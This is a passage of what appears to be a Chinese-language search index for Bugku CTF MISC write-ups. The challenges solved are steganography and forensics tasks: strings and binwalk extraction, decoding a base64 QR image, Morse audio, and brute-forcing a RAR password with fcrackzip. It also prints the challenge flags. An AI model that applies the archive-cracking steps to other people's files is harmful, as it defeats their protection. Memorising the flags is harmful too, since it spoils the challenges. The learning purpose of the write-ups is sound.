\u5f97\u5230\u4e86\u4e00\u4e32BASE64\u7684\u56fe\u7247\uff1a 1 data : image /jpg;base64,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 SqtvcdpBh + wAAAABJRU5ErkJggg == \u89e3\u5f00\u5f97\u5230\u4e8c\u7ef4\u7801\uff1a \u89e3\u7801\uff1a 1 KEY { dca57f966e4e4e31fd5b15417da63269 } \u95ea\u7684\u597d\u5feb \u6709\u7a7a\u8865\u4ee3\u7801 come_game \u6709\u7a7a\u8865\u4e0a \u767d\u54e5\u7684\u9e3d\u5b50 \u5495\u5495\u5495 jpg \u5b58\u6863\uff1a jpg \u89e3\u51b3\u65b9\u6848 \u5e9f\u8bdd\u5c11\u8bf4\uff0c\u4e0a\u5404\u79cd\u5957\u8def\uff1a 1 strings . / jpg \u672b\u5c3e\u53ef\u7591\uff1a 1 fg2ivyo } l { 2 s3_o @aw__rcl @ \u770b\u8d77\u6765\u50cf\u662f\u88ab\u6253\u4e71\u4e86\u987a\u5e8f\uff0c\u6805\u680f\u5bc6\u7801\u6bcf\u7ec43\u4e2a\uff0c\u6bd5\u7adf\u7814\u8868\u7a76\u660e\uff0c\u6c49\u5b57\u5e8f\u987a\u5e76\u4e0d\u5b9a\u4e00\u5f71\u9605\u54cd\u8bfb\uff1a 1 flag { w22_is_v3ry_cool } @@ \u63d0\u4ea4\u7adf\u7136\u6302\u4e86...\u5220\u6389@@\u5c31OK","title":"MISC 60"},{"location":"ctf_writeup/bugku/misc_60/#_1","text":"http://123.206.87.240:8002/misc/2.jpg \u597d\u50cf\u548c\u4e0a\u4e00\u4e2a\u6709\u70b9\u4e0d\u4e00\u6837 \u5b58\u6863\uff1a 2.jpg","title":"\u53c8\u4e00\u5f20\u56fe\u7247\uff0c\u8fd8\u5355\u7eaf\u5417"},{"location":"ctf_writeup/bugku/misc_60/#_2","text":"binwalk\u53d1\u73b0\u5185\u542b\u4e24\u5f20\u56fe\u7247\uff0cforemost\u63d0\u53d6\u4e00\u4e0b\uff1a \u771f\u591f\u957f\u7684\uff1a 1 falg { NSCTF_e6532a34928a3d1dadd0b049d5a3cc57 }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/#_3","text":"http://123.206.87.240:8002/misc/cai/QQ20170221-132626.png flag\u683c\u5f0fkey{\u67d0\u4eba\u540d\u5b57\u5168\u62fc} \u5b58\u6863\uff1a QQ20170221-132626.png","title":"\u731c"},{"location":"ctf_writeup/bugku/misc_60/#_4","text":"\u641e\u4e86\u534a\u5929\u5565\u7528\u90fd\u6ca1\u6709\uff0c\u7ed3\u679c\u53d1\u73b0\u5927\u5bb6\u90fd\u662f\u4e22\u5230\u8bc6\u56fe\u91cc\u9762\uff1f 1 key { liuyifei } \u670d\u4e86...","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/#_5","text":"flag\u683c\u5f0f\uff1a flag{\u5bbd\u5e26\u7528\u6237\u540d} conf.bin \u5b58\u6863\uff1a conf.bin","title":"\u5bbd\u5e26\u4fe1\u606f\u6cc4\u9732"},{"location":"ctf_writeup/bugku/misc_60/#_6","text":"\u4e0aRouterPassView\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\uff0c\u4f46\u662f\u4f3c\u4e4e\u6ca1\u627e\u5230\u6e90\u7801...\u633a\u597d\u5947\u539f\u7406...","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/#2","text":"Welcome_.jpg \u5b58\u6863\uff1a Welcome_,jpg","title":"\u9690\u51992"},{"location":"ctf_writeup/bugku/misc_60/#_7","text":"\u4e0b\u8f7d\u5230\u7684\u6587\u4ef6\uff0c\u5c5e\u6027\u91cc\u4f3c\u4e4e\u6709\u63d0\u793a\uff0c \u5b8c\u5168\u6ca1\u770b\u61c2\uff0c\u76f4\u63a5binwalk\u770b\u770b\u3002\u5185\u542bzip\u6587\u4ef6\uff0cforemost\u63d0\u53d6\uff0c\u89e3\u538bzip\u540e\u6709flag.rar\u548c\u63d0\u793a.jpg\u3002\u597d\u5427\u63d0\u793a\u4e5f\u6ca1\u770b\u61c2\uff0c\u6211\u5c31\u770b\u61c2\u4e86\u5bc6\u7801\u662f3\u4f4d\u6570\u5b57\uff0c\u90a3\u5c31\u76f4\u63a5\u7206\u7834\u597d\u4e86\u3002 \u751f\u6210\u4e00\u4e0b\u4e09\u4f4d\u6570\u5b57\u7684\u5b57\u5178\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 #include <iostream> #include <fstream> #include <iomanip> int main () { std :: ofstream outputFileStream ( \"./dict_3numbers.txt\" ); for ( size_t i = 0 ; i < 1000 ; ++ i ) { outputFileStream << std :: setw ( 3 ) << std :: setfill ( '0' ) << i << std :: endl ; } outputFileStream . close (); return 0 ; } \u7136\u540e\uff1a 1 fcrackzip - b - D - p . / dict_3numbers . txt . / flag . rar \u6216\u8005\u76f4\u63a5\uff1a 1 fcrackzip - b - c \"1\" - l 3 . / flag . rar \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 possible pw found : 035 () possible pw found : 337 () possible pw found : 728 () possible pw found : 871 () 871\u89e3\u5f00\u538b\u7f29\u5305\uff0c\u6709\u4e2a3.jpg\uff0c\u6ca1\u5565\u4fe1\u606f\uff0c\u8bd5\u8bd5\uff1a 1 strings . / 3 . jpg \u672b\u5c3e\u6709\u4e1c\u897f\uff0c\u63d0\u4ea4\u4e86\u4e0d\u5bf9\uff1a 1 f1 @g { eTB1IEFyZSBhIGhAY2tlciE = } BASE64\u89e3\u5f00\uff1a 1 f1 @g { y0u Are a h @cker !}","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/#_8","text":"\u5728\u505a\u9898\u8fc7\u7a0b\u4e2d\u4f60\u4f1a\u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\u56fe\u7247 http://123.206.87.240:8002/misc/3.zip \u5b58\u6863\uff1a 3.zip","title":"\u591a\u79cd\u65b9\u6cd5\u89e3\u51b3"},{"location":"ctf_writeup/bugku/misc_60/#_9","text":"\u76f4\u63a5\uff1a 1 strings . / KEY . exe \u5f97\u5230\u4e86\u4e00\u4e32BASE64\u7684\u56fe\u7247\uff1a 1 data : image /jpg;base64,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 SqtvcdpBh + wAAAABJRU5ErkJggg == \u89e3\u5f00\u5f97\u5230\u4e8c\u7ef4\u7801\uff1a \u89e3\u7801\uff1a 1 KEY { dca57f966e4e4e31fd5b15417da63269 }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/#_10","text":"\u6709\u7a7a\u8865\u4ee3\u7801","title":"\u95ea\u7684\u597d\u5feb"},{"location":"ctf_writeup/bugku/misc_60/#come_game","text":"\u6709\u7a7a\u8865\u4e0a","title":"come_game"},{"location":"ctf_writeup/bugku/misc_60/#_11","text":"\u5495\u5495\u5495 jpg \u5b58\u6863\uff1a jpg","title":"\u767d\u54e5\u7684\u9e3d\u5b50"},{"location":"ctf_writeup/bugku/misc_60/#_12","text":"\u5e9f\u8bdd\u5c11\u8bf4\uff0c\u4e0a\u5404\u79cd\u5957\u8def\uff1a 1 strings . / jpg \u672b\u5c3e\u53ef\u7591\uff1a 1 fg2ivyo } l { 2 s3_o @aw__rcl @ \u770b\u8d77\u6765\u50cf\u662f\u88ab\u6253\u4e71\u4e86\u987a\u5e8f\uff0c\u6805\u680f\u5bc6\u7801\u6bcf\u7ec43\u4e2a\uff0c\u6bd5\u7adf\u7814\u8868\u7a76\u660e\uff0c\u6c49\u5b57\u5e8f\u987a\u5e76\u4e0d\u5b9a\u4e00\u5f71\u9605\u54cd\u8bfb\uff1a 1 flag { w22_is_v3ry_cool } @@ \u63d0\u4ea4\u7adf\u7136\u6302\u4e86...\u5220\u6389@@\u5c31OK","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_80/","text":"linux http://123.206.87.240:8002/misc/1.tar.gz linux\u57fa\u7840\u95ee\u9898 \u5b58\u6863\uff1a 1.tar.gz \u89e3\u51b3\u65b9\u6848 \u975e\u9884\u671f\u5427...\u6211\u662f\u76f4\u63a57-Zip\u4e00\u8def\u5f00\u5230\u5e95\u7684\u90a3\u79cd\u4eba...\u7136\u540e\u5c31\u770b\u5230\u4e86flag.txt... 1 key { feb81d3834e2423c9903f4755464060b } \u9690\u51993 58d54bd3e134e.zip \u5b58\u6863\uff1a 58d54bd3e134e.zip \u89e3\u51b3\u65b9\u6848 \u53c8\u6765... \u76f4\u63a5\u7c97\u66b4\u5730\u628a\u9ad8\u5ea6\u8c03\u5927\uff1a \u770b\u5230\u4e86\uff1a 1 flag { He1l0_d4_ba1 }","title":"MISC 80"},{"location":"ctf_writeup/bugku/misc_80/#linux","text":"http://123.206.87.240:8002/misc/1.tar.gz linux\u57fa\u7840\u95ee\u9898 \u5b58\u6863\uff1a 1.tar.gz","title":"linux"},{"location":"ctf_writeup/bugku/misc_80/#_1","text":"\u975e\u9884\u671f\u5427...\u6211\u662f\u76f4\u63a57-Zip\u4e00\u8def\u5f00\u5230\u5e95\u7684\u90a3\u79cd\u4eba...\u7136\u540e\u5c31\u770b\u5230\u4e86flag.txt... 1 key { feb81d3834e2423c9903f4755464060b }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_80/#3","text":"58d54bd3e134e.zip \u5b58\u6863\uff1a 58d54bd3e134e.zip","title":"\u9690\u51993"},{"location":"ctf_writeup/bugku/misc_80/#_2","text":"\u53c8\u6765... \u76f4\u63a5\u7c97\u66b4\u5730\u628a\u9ad8\u5ea6\u8c03\u5927\uff1a \u770b\u5230\u4e86\uff1a 1 flag { He1l0_d4_ba1 }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u4e4c\u4e91\u9080\u8bf7\u7801/","text":"\u6765\u6e90\uff1aXJNU misc50.zip \u5b58\u6863\uff1a misc50.zip \u89e3\u51b3\u65b9\u6848 StegSolve\u6253\u5f00\u540e\u770b\u5230\u4f4e\u901a\u5230\u5de6\u4e0a\u65b9\u6709\u5f02\u5e38\uff1a \u8bd5\u8bd5Analyse->Data Extract\uff0c\u8c03\u6574\u4e00\u4e0b\u987a\u5e8f\uff1a","title":"\u4e4c\u4e91\u9080\u8bf7\u7801"},{"location":"ctf_writeup/bugku/\u4e4c\u4e91\u9080\u8bf7\u7801/#_1","text":"StegSolve\u6253\u5f00\u540e\u770b\u5230\u4f4e\u901a\u5230\u5de6\u4e0a\u65b9\u6709\u5f02\u5e38\uff1a \u8bd5\u8bd5Analyse->Data Extract\uff0c\u8c03\u6574\u4e00\u4e0b\u987a\u5e8f\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u542c\u9996\u97f3\u4e50/","text":"\u542c\u9996\u97f3\u4e50\u653e\u677e\u653e\u677e\u5427~ \u4e0b\u8f7d\u5730\u5740\uff1a\u94fe\u63a5: http://pan.baidu.com/s/1gfvezBl \u5bc6\u7801: y6gh \u5b58\u6863\uff1a steg100.rar \u89e3\u51b3\u65b9\u6848 Audacity\u6253\u5f00\u53d1\u73b0\u5de6\u58f0\u9053\u6709\u95ee\u9898\uff1a \u770b\u8d77\u6765\u50cf\u662f\u6469\u65af\u7535\u7801\uff1a \u8bd5\u8bd5\uff1a 1 ..... - ... - . - . ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. \u8f6c\u6362\u4e00\u4e0b\uff1a 1 5 BC925649CB0188F52E617D70929191C \u770b\u7740\u5f88\u5947\u602a\uff0c\u4e0d\u8fc7\u5c31\u662f\u5b83\u3002","title":"\u542c\u9996\u97f3\u4e50"},{"location":"ctf_writeup/bugku/\u542c\u9996\u97f3\u4e50/#_1","text":"Audacity\u6253\u5f00\u53d1\u73b0\u5de6\u58f0\u9053\u6709\u95ee\u9898\uff1a \u770b\u8d77\u6765\u50cf\u662f\u6469\u65af\u7535\u7801\uff1a \u8bd5\u8bd5\uff1a 1 ..... - ... - . - . ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. \u8f6c\u6362\u4e00\u4e0b\uff1a 1 5 BC925649CB0188F52E617D70929191C \u770b\u7740\u5f88\u5947\u602a\uff0c\u4e0d\u8fc7\u5c31\u662f\u5b83\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u56fe\u7a77\u5315\u89c1/","text":"\u4f5c\u8005\uff1aNIPC paintpaintpaint.jpg \u5b58\u6863\uff1a paintpaintpaint.jpg \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u4e00\u4e2ajpg\uff0c\u6709\u4e2aHint\uff1a \u5927\u5c0f\u504f\u5927\uff0cforemost\u51fa\u6765\u7684jpg\u53ea\u670921K\uff0c\u4f46\u662f\u539f\u6587\u4ef6\u6709634K\uff0c\u4f30\u8ba1\u540e\u9762\u6709\u6570\u636e\uff0c\u4e8e\u662f\u7528UltraEdit\u5207\u6389\u524d\u9762\uff0c\u5f88\u6709\u89c4\u5f8b\uff1a \u5c1d\u8bd5\u7740\u5c06\u5176\u8f6c\u4e3aASCII\uff0c\u53d1\u73b0\u662f\u4e00\u5806\u5750\u6807\uff0c\u4f30\u8ba1\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u4e8e\u662f\u4ee3\u7801\u8d70\u8d77\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include <fstream> #include <sstream> #include <opencv2/opencv.hpp> int main () { std :: ifstream inputFileStream ( \"./paintpaintpaint.jpg\" ); std :: stringstream ss ; while ( ! inputFileStream . eof ()) { char ch1 , ch2 ; inputFileStream >> ch1 >> ch2 ; ch1 = ( 'a' <= ch1 && ch1 <= 'f' ) ? ( ch1 - 'a' ) : ( ch1 - '0' ); ch2 = ( 'a' <= ch2 && ch2 <= 'f' ) ? ( ch2 - 'a' ) : ( ch2 - '0' ); char ch = ( ch1 << 4 ) + ch2 ; ss << (( '0' <= ch && ch <= '9' ) ? ch : ' ' ); } cv :: Mat img ( 300 , 300 , CV_8UC1 , cv :: Scalar ( 255 )); while ( ! ss . eof ()) { int row , col ; ss >> row >> col ; img . at < uchar > ( row , col ) = 0 ; } cv :: imwrite ( \"output.png\" , img ); return 0 ; } \u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff1a \u626b\u4e00\u4e0b\uff1a 1 flag { 40 fc0a979f759c8892f4dc045e28b820 }","title":"\u56fe\u7a77\u5315\u89c1"},{"location":"ctf_writeup/bugku/\u56fe\u7a77\u5315\u89c1/#_1","text":"\u4e0b\u8f7d\u5230\u4e00\u4e2ajpg\uff0c\u6709\u4e2aHint\uff1a \u5927\u5c0f\u504f\u5927\uff0cforemost\u51fa\u6765\u7684jpg\u53ea\u670921K\uff0c\u4f46\u662f\u539f\u6587\u4ef6\u6709634K\uff0c\u4f30\u8ba1\u540e\u9762\u6709\u6570\u636e\uff0c\u4e8e\u662f\u7528UltraEdit\u5207\u6389\u524d\u9762\uff0c\u5f88\u6709\u89c4\u5f8b\uff1a 